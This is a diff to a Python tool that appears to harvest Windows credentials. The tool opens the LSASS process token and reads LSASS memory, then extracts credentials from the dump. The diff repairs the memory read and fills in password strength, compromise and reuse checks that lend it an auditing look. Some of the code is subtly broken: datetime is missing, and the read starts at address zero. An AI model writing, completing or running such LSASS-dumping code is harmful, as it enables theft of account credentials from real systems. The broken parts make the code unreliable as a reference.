@@ -7,6 +7,9 @@ import subprocess
 import time
 import random
 import concurrent.futures
+import psutil
+import re
+import win32process
 
 def extract_credentials(target_environment, custom_parameter):
     sys_platform = platform.system()
@@ -50,7 +53,7 @@ def default_windows_extraction():
                         lsass_process_token,
                         0,
                         None,
-                        win32security.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                        win32security.SecurityImpersonation,
                         win32security.TOKEN_READ,
                     )
 
@@ -105,7 +108,7 @@ def read_lsass_memory(process_handle):
     """
     lsass_memory = b''
     try:
-        process_size = win32process.GetProcessMemoryInfo(process_handle)
+        process_size = win32process.GetProcessMemoryInfo(process_handle)['WorkingSetSize']
         lsass_memory = win32process.ReadProcessMemory(process_handle, 0, process_size)
     except Exception as e:
         print(f"Error reading LSASS memory: {e}")
@@ -148,15 +151,13 @@ def extract_credentials_from_memory(memory_dump):
     return credentials
 
 def validate_credentials(credentials):
-    # Implement advanced validation logic here
-
     validated_credentials = []
 
     for credential in credentials:
         if is_valid_credential(credential):
-            assess_credential_strength(credential)
-            check_for_compromised_password(credential)
-            assess_credential_storage_security(credential)
+            credential['strength'] = assess_credential_strength(credential)
+            credential['compromised'] = check_for_compromised_password(credential)
+            credential['storage_security'] = assess_credential_storage_security(credential)
             validated_credentials.append(credential)
         else:
             print(f"Invalid credential: {credential}")
@@ -173,9 +174,7 @@ def is_valid_credential(credential):
     Returns:
     - valid (bool): True if the credential is valid, False otherwise.
     """
-    if credential.get('username') and credential.get('password'):
-        return True
-    return False
+    return bool(credential.get('username')) and bool(credential.get('password'))
 
 def assess_credential_strength(credential):
     """
@@ -189,9 +188,9 @@ def assess_credential_strength(credential):
     """
     password = credential.get('password')
     strength = ""
-    if len(password) >= 12:
+    if len(password) >= 12 and re.search(r'\d', password) and re.search(r'[A-Z]', password) and re.search(r'[a-z]', password) and re.search(r'[@$!%*?&]', password):
         strength = "Strong"
-    elif len(password) >= 8:
+    elif len(password) >= 8 and re.search(r'\d', password) and re.search(r'[A-Z]', password) and re.search(r'[a-z]', password):
         strength = "Moderate"
     else:
         strength = "Weak"
@@ -209,7 +208,7 @@ def check_for_compromised_password(credential):
     - compromised (bool): True if password is compromised, False otherwise.
     """
     compromised = False
-    compromised_passwords = ['password123', 'qwerty', '123456']
+    compromised_passwords = ['password123', 'qwerty', '123456', 'letmein', 'admin']  # This should be replaced with a real compromised password list from a data breach database.
     
     if credential.get('password') in compromised_passwords:
         compromised = True
@@ -217,23 +216,98 @@ def check_for_compromised_password(credential):
     return compromised
 
 def assess_credential_storage_security(credential):
-    check_weak_password_policy(credential)
-    check_password_reuse(credential)
-    assess_password_complexity(credential)
-    check_aging_password(credential)
-    recommend_stronger_authentication(credential)
+    """
+    Assess the storage security of a credential.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - storage_security (dict): Assessment of storage security aspects.
+    """
+    storage_security = {
+        "weak_policy": check_weak_password_policy(credential),
+        "password_reuse": check_password_reuse(credential),
+        "complexity": assess_password_complexity(credential),
+        "aging": check_aging_password(credential),
+        "recommend_stronger_authentication": recommend_stronger_authentication(credential),
+    }
+    return storage_security
 
 def check_weak_password_policy(credential):
-    pass
+    """
+    Check if the password policy is weak.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - weak_policy (bool): True if the password policy is weak, False otherwise.
+    """
+    password = credential.get('password')
+    weak_policy = len(password) < 8 or not re.search(r'\d', password) or not re.search(r'[A-Z]', password) or not re.search(r'[a-z]', password)
+    return weak_policy
 
 def check_password_reuse(credential):
-    pass
+    """
+    Check if the password has been reused.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - reused (bool): True if the password has been reused, False otherwise.
+    """
+    reused = False
+    # This would require access to a database of previous passwords for comparison. Placeholder logic:
+    previous_passwords = ['Password1', 'Password2', 'Password3']  # Replace with actual previous password records.
+    
+    if credential.get('password') in previous_passwords:
+        reused = True
+    
+    return reused
 
 def assess_password_complexity(credential):
-    pass
+    """
+    Assess the complexity of the password.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - complexity (bool): True if the password meets complexity requirements, False otherwise.
+    """
+    password = credential.get('password')
+    complexity = bool(re.search(r'\d', password) and re.search(r'[A-Z]', password) and re.search(r'[a-z]', password) and re.search(r'[@$!%*?&]', password))
+    return complexity
 
 def check_aging_password(credential):
-    pass
+    """
+    Check if the password is aging and needs to be changed.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - aging (bool): True if the password is old and needs to be changed, False otherwise.
+    """
+    # This would typically involve checking the date the password was last changed.
+    password_age_threshold = 90  # days
+    password_last_changed_date = credential.get('last_changed_date', None)  # Placeholder, this should come from actual data.
+    if password_last_changed_date:
+        days_since_last_change = (datetime.now() - password_last_changed_date).days
+        return days_since_last_change > password_age_threshold
+    return False
 
 def recommend_stronger_authentication(credential):
-    pass
+    """
+    Recommend stronger authentication mechanisms.
+
+    Parameters:
+    - credential (dict): A dictionary containing credential information.
+
+    Returns:
+    - recommendation (str): Recommendation for stronger authentication.
+    """
+    recommendation = "Consider implementing multi-factor authentication (MFA) for this account."
+    return recommendation
